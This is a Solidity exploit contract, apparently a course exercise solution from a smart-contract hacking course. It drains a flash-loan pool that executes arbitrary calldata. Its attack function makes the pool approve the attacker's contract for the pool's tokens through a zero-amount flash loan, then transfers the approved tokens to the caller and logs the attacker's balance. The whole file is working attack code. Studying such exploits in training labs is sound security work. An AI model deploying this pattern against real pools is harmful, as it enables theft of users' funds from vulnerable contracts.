// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface Pool {
    function requestFlashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
    function token() external returns(IERC20);
}

contract Attack {

    using Address for address;
    using SafeERC20 for IERC20;

    Pool public pool;
    IERC20 public token;
    address private owner;

    constructor (address _pool) {
        pool = Pool(_pool);
        token = pool.token();
        owner = msg.sender;
    }

    function attack(uint256 _amount) public {
        require(msg.sender == owner, "not owner");
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), _amount
        );
        pool.requestFlashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, _amount);
        console.log("attacker balance", token.balanceOf(msg.sender));
    }

}